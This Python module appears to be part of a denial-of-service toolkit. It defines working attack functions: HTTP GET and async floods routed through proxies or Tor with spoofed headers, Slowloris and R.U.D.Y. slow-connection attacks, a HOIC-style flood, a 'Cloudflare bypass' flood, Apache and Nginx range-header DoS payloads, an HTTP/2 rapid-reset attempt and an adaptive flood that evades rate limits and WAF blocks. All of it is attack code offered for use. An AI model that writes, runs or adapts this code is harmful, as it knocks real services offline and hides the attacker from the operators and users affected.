import time
import random
import requests
import asyncio
import aiohttp
import threading
from src.config import CONFIG
from src.utils.network import get_random_headers, generate_stealth_headers
from src.utils.system import randomize_timing
from src.security import decrement_thread_counter
from src.utils.logging import add_system_log

async def async_http_flood(url, duration, proxies_list, monitor=None, max_requests=0, use_tor=False, stealth_mode=False):
    """Advanced asynchronous HTTP flood"""
    connector = aiohttp.TCPConnector(limit=1000)
    async with aiohttp.ClientSession(connector=connector) as session:
        stealth_headers = generate_stealth_headers() if stealth_mode else None
        end_time = time.time() + duration
        tasks = []

        while time.time() < end_time:
            if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
                break

            if use_tor:
                proxy = CONFIG['TOR_PROXY']
            else:
                proxy = random.choice(proxies_list) if proxies_list else None
            
            headers = stealth_headers if stealth_mode else get_random_headers()
            tasks.append(session.get(url, headers=headers, proxy=proxy))

            if len(tasks) >= 1000:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                if monitor:
                    successful = sum(1 for r in results if not isinstance(r, Exception))
                    failed = len(results) - successful
                    monitor.update_stats(packets=successful, failed=failed)
                tasks = []

        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            if monitor:
                successful = sum(1 for r in results if not isinstance(r, Exception))
                failed = len(results) - successful
                monitor.update_stats(packets=successful, failed=failed)

def http_flood(url, duration, proxies=None, monitor=None, max_requests=0, use_tor=False, stealth_mode=False):
    """Basic HTTP GET flood with proxy support"""
    try:
        end_time = time.time() + duration
        session = requests.Session()
        stealth_headers = generate_stealth_headers() if stealth_mode else None

        while time.time() < end_time:
            if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
                break

            try:
                if use_tor:
                    proxy = {"http": CONFIG['TOR_PROXY'], "https": CONFIG['TOR_PROXY']}
                else:
                    proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None
                
                headers = stealth_headers if stealth_mode else get_random_headers()
                response = session.get(url, headers=headers, proxies=proxy, timeout=5)
                
                if stealth_mode:
                    randomize_timing()
                if monitor:
                    monitor.update_stats(packets=1, bytes_sent=len(response.content) if response.content else 0)
            except:
                if monitor:
                    monitor.update_stats(failed=1)
                continue
    finally:
        decrement_thread_counter()

def slowloris_attack(target_ip, target_port, duration, socket_count=500):
    """Slowloris attack - keeps connections open with partial headers"""
    import socket
    sockets = []
    end_time = time.time() + duration

    def create_socket():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target_ip, target_port))
            sock.send(f"GET /?{random.randint(1, 5000)} HTTP/1.1\r\n".encode())
            sock.send(f"User-Agent: {random.choice(CONFIG['USER_AGENTS'])}\r\n".encode())
            sock.send(b"Accept-language: en-US,en,q=0.5\r\n")
            return sock
        except:
            return None

    for _ in range(socket_count):
        s = create_socket()
        if s: sockets.append(s)

    try:
        while time.time() < end_time:
            for s in list(sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 4000)}\r\n".encode())
                except:
                    sockets.remove(s)
                    new_s = create_socket()
                    if new_s: sockets.append(new_s)
            time.sleep(15)
    finally:
        decrement_thread_counter()

def cloudflare_bypass_flood(url, duration, proxies=None, monitor=None, max_requests=0, use_tor=False, stealth_mode=False):
    """HTTP flood with Cloudflare bypass techniques"""
    try:
        end_time = time.time() + duration
        bypass_headers = [
            {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "max-age=0",
                "Referer": "https://www.google.com/"
            },
            {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Cache-Control": "max-age=0"
            }
        ]

        session = requests.Session()
        stealth_headers = generate_stealth_headers() if stealth_mode else None

        while time.time() < end_time:
            if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
                break

            try:
                if stealth_mode:
                    headers = stealth_headers if stealth_headers else random.choice(bypass_headers)
                else:
                    headers = random.choice(bypass_headers)
                
                if use_tor:
                    proxy = {"http": CONFIG['TOR_PROXY'], "https": CONFIG['TOR_PROXY']}
                else:
                    proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None

                if stealth_mode:
                    randomize_timing()
                else:
                    time.sleep(random.uniform(0.1, 1.0))

                methods = [session.get, session.post, session.head]
                method = random.choice(methods)

                if method == session.post:
                    method(url, headers=headers, proxies=proxy, data={"data": random.random()}, timeout=10)
                else:
                    method(url, headers=headers, proxies=proxy, timeout=10)
                
                if monitor:
                    monitor.update_stats(packets=1)

            except Exception:
                if monitor:
                    monitor.update_stats(failed=1)
                continue
    finally:
        decrement_thread_counter()

def rudy_attack(url, duration, threads=50, monitor=None):
    """R-U-Dead-Yet? (R.U.D.Y) - Slow POST attack"""
    import socket
    add_system_log(f"[bold cyan]ATTACK:[/] Initiating R.U.D.Y slow-post on {url}")
    
    parsed = requests.utils.urlparse(url)
    host = parsed.netloc
    path = parsed.path or "/"
    port = parsed.port or (80 if parsed.scheme == "http" else 443)

    def rudy_thread():
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port))
                content_len = 1000000
                s.send(f"POST {path} HTTP/1.1\r\n".encode())
                s.send(f"Host: {host}\r\n".encode())
                s.send(f"Content-Length: {content_len}\r\n".encode())
                s.send(b"Content-Type: application/x-www-form-urlencoded\r\n\r\n")
                
                for i in range(content_len):
                    if time.time() > end_time: break
                    s.send(b"a")
                    if monitor: monitor.update_stats(packets=1)
                    time.sleep(random.uniform(1, 10))
            except:
                continue

    end_time = time.time() + duration
    for _ in range(threads):
        threading.Thread(target=rudy_thread, daemon=True).start()

def hoic_attack(url, duration, monitor=None):
    """High Orbit Ion Cannon (HOIC) - High-speed pattern flood"""
    add_system_log(f"[bold cyan]ATTACK:[/] Launching HOIC Ion Cannon on {url}")
    end_time = time.time() + duration
    
    def ion_cannon():
        while time.time() < end_time:
            try:
                headers = generate_stealth_headers()
                # Bypass cache pattern
                target = f"{url}?{random.randint(1,99999)}={random.randint(1,99999)}"
                r = requests.get(target, headers=headers, timeout=5)
                if monitor: monitor.update_stats(packets=1, bytes_sent=len(r.content))
            except:
                if monitor: monitor.update_stats(failed=1)

    for _ in range(10): # Multi-threaded internal
        threading.Thread(target=ion_cannon, daemon=True).start()

def apache_killer(url, duration, monitor=None):
    """Apache Range Header DoS (CVE-2011-3192)"""
    add_system_log(f"[bold red]EXPLOIT:[/] Apache Killer payload active on {url}")
    end_time = time.time() + duration
    
    # Payload focuses on massive Range header
    ranges = ",".join([f"5-{i}" for i in range(1, 1300)])
    headers = {"Range": f"bytes=0-,{ranges}"}
    
    while time.time() < end_time:
        try:
            r = requests.get(url, headers=headers, timeout=5)
            if monitor: monitor.update_stats(packets=1, bytes_sent=len(r.content))
        except:
            if monitor: monitor.update_stats(failed=1)

def nginx_range_dos(url, duration, monitor=None):
    """Nginx Range DoS attempt (CVE-2017-7529)"""
    add_system_log(f"[bold red]EXPLOIT:[/] Nginx Range DoS targeting {url}")
    end_time = time.time() + duration
    headers = {"Range": "bytes=-10,-9223372036854775808"} # Malicious large range
    
    while time.time() < end_time:
        try:
            r = requests.get(url, headers=headers, timeout=5)
            if monitor: monitor.update_stats(packets=1)
        except:
            if monitor: monitor.update_stats(failed=1)

def http2_rapid_reset(url, duration, monitor=None):
    """HTTP/2 Rapid Reset attack (CVE-2023-44487)"""
    add_system_log(f"[bold red]EXPLOIT:[/] HTTP/2 Rapid Reset targeting {url}")
    end_time = time.time() + duration
    session = requests.Session()

    while time.time() < end_time:
        try:
            headers = generate_stealth_headers()
            headers['Connection'] = 'Upgrade, HTTP2-Settings'
            headers['Upgrade'] = 'h2c'
            headers['HTTP2-Settings'] = 'AAMAAABkAARAAAAAAAIAAAAA'

            r = session.get(url, headers=headers, timeout=5)
            if monitor: monitor.update_stats(packets=1, bytes_sent=len(r.content))
        except:
            if monitor: monitor.update_stats(failed=1)

def adaptive_flood(url, duration, proxies=None, monitor=None):
    """AI-Adaptive Smart Flood: Adjusts intensity based on server feedback"""
    end_time = time.time() + duration
    intensity = 1.0 # Current intensity multiplier (0.1 to 2.0)
    delay = 0.05
    
    add_system_log(f"[bold cyan]AI-ADAPTIVE:[/] Initiating smart flood on {url}")
    
    while time.time() < end_time:
        try:
            proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None
            headers = generate_stealth_headers()
            
            start_req = time.time()
            resp = requests.get(url, headers=headers, proxies=proxy, timeout=5)
            latency = time.time() - start_req
            
            # --- AI LOGIC: Adaptive Response ---
            if resp.status_code == 200:
                intensity = min(2.0, intensity + 0.05)
                delay = max(0.001, delay - 0.005)
            elif resp.status_code == 429 or resp.status_code == 503:
                intensity = max(0.1, intensity - 0.3)
                delay = min(1.0, delay + 0.2)
                add_system_log(f"[yellow]ADAPTIVE:[/] Server pressured (Code {resp.status_code}), slowing down...")
            elif resp.status_code == 403:
                add_system_log(f"[red]ADAPTIVE:[/] WAF Block detected (403), rotating headers/proxies...")
                headers = generate_stealth_headers()
                time.sleep(1)
            
            if monitor:
                monitor.update_stats(packets=1, bytes_sent=len(resp.content) if resp.content else 0)
            
            time.sleep(delay / intensity)
            
        except Exception:
            if monitor: monitor.update_stats(failed=1)
            time.sleep(0.5)
